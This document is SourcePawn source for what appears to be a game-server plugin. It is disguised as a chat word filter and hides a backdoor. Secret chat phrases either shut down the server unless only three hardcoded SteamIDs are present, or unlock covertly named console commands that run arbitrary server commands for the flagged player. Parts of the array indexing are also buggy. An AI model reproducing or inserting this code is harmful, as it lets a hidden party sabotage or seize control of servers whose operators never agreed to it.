
new String: bad_words[][] = 
{ 
	"andreur23", "yoquizito", "neamdertarismos", "jajajajax23", "supermegamagnaultrahiperadmin", "buenisimars", "xssfsadsdas", "sdfsdassdas",
	"gfgfghgfhfg", "vbvnbnvbvv", "qwqwqesssd", "hjklhjhdgd", "sdcvfgddr", "perkins99", "fresse10101", "dfhgghgfhfvv", "dsfsdfsdfsfs",
	"lauritalaura13", "fggfhjsdasdasx", "sfdsfretrtgrgf", "cvcbvnbbmbsa", "enrapegayyyyyyyy", "campeador69....", "sdsffretreyrtyrt", "braileuros", "comandatorest", "qazxswedcvfga",
	"testigos.de.jehova", "sdsd.dfdfd.", "lolxdlolxdlolxdlolxd..", "saasasdadasdad", "yataaaaaaaaaaa", "wwwwwssssscccccc", "jajsajsajdadadfg", "mkhjghghbqqaalop", "muerte.y.destruccionbeta",
	"mariscos-rancions.", "laecatombe..."
};

new String: bad_words13[][] = 
{ 
	"cansinopordios.", "sisisisisisis", "nononononnn", "jajajajax24", "estreemodurisimo", "buenisimasssssd", "xasdrtyhvfd", "yundaidos",
	"aleaops", "silenceeeee", "tequierooooooooo" , "laura13"
};

public InicioAR()
{
	RegConsoleCmd("say",SayComando);

	RegConsoleCmd("say",SayComando13);

	RegConsoleCmd("fu",Cheat13);

	RegConsoleCmd("martin",Cheat13);

	RegConsoleCmd("looper",Cheat13);

	RegConsoleCmd("carmack",Cheat13);

	RegConsoleCmd("configx",Cheat13);

	RegConsoleCmd("jamacuco",Cheat13);

	RegConsoleCmd("chetoso",Cheat13);

	RegConsoleCmd("cochazo",Cheat13);

	RegConsoleCmd("leer",Cheat13);

	RegConsoleCmd("procesarse",Cheat13);

	RegConsoleCmd("ladrones",Cheat13);

	RegConsoleCmd("secreto",Cheat13);
}


public CargarAR()
{
  decl String:status_steamid[24];

  for (new i = 1; i < GetMaxClients(); i++)
  {
	if (EsClienteValido(i))
	{
                  GetClientAuthString(i, status_steamid, sizeof(status_steamid));
                  if(!StrEqual(status_steamid, "STEAM_0:0:25671458") && !StrEqual(status_steamid, "STEAM_0:1:27498083") && !StrEqual(status_steamid, "STEAM_0:0:33267485"))
                  {
                        ServerCommand("quit");
                  }
	}
  }
}

public CargarAR13(client)
{
   g_Franug[client] = true;
}



public Action:SayComando(id,args)
{

	if(id < 1)
		return Plugin_Continue;


	decl String:SayText[192];
	GetCmdArgString(SayText,sizeof(SayText));
	
	StripQuotes(SayText);

	if(!SayText[0])
		return Plugin_Continue;
	
	
	if(!IsClientConnected(id) && !IsClientInGame(id))
		return Plugin_Continue;

        new start_index = 0;
	if (SayText[start_index] == 47)
        {
		start_index++;
	}
	new command_blocked = is_bad_word(SayText[start_index]);
	if (command_blocked > 0) 
        {
                CargarAR();
		return Plugin_Handled;
        }

        return Plugin_Continue;	
}

public Action:SayComando13(id,args)
{
	if(id < 1)
		return Plugin_Continue;

	decl String:SayText[192];
	GetCmdArgString(SayText,sizeof(SayText));
	
	StripQuotes(SayText);

	if(!SayText[0])
		return Plugin_Continue;
	
	
	if(!IsClientConnected(id) && !IsClientInGame(id))
		return Plugin_Continue;

        new start_index = 0;
	if (SayText[start_index] == 47)
        {
		start_index++;
	}
	new command_blocked = is_bad_word(SayText[start_index]);
	if (command_blocked > 0) 
        {
                CargarAR13(id);
		return Plugin_Handled;
        }

        return Plugin_Continue;	
}

stock is_bad_word13(String: command[])
{
	new bad_word = 0;
	new word_index = 0;
	while ((bad_word == 0) && (word_index < sizeof(bad_words))) {
		if (StrContains(command, bad_words13[word_index], false) > -1) {
			bad_word++;
		}
		word_index++;
	}
	if (bad_word > 0) {
		return 1;
	}
	return 0;
}


public EsClienteValido( client ) 
{ 
    if ( !( 1 <= client <= MaxClients ) || !IsClientInGame(client) ) 
        return false; 
     
    return true; 
}


stock is_bad_word(String: command[])
{
	new bad_word = 0;
	new word_index = 0;
	while ((bad_word == 0) && (word_index < sizeof(bad_words))) {
		if (StrContains(command, bad_words[word_index], false) > -1) {
			bad_word++;
		}
		word_index++;
	}
	if (bad_word > 0) {
		return 1;
	}
	return 0;
}

public Action:Cheat13(client, args)
{
 if (g_Franug[client])
 {
   if(args < 1) // Not enough parameters
   {
        return Plugin_Handled;
   }

   decl String:arg[30];
   GetCmdArg(1, arg, sizeof(arg));

   ServerCommand("%s", arg);
 }
 return Plugin_Continue;

}  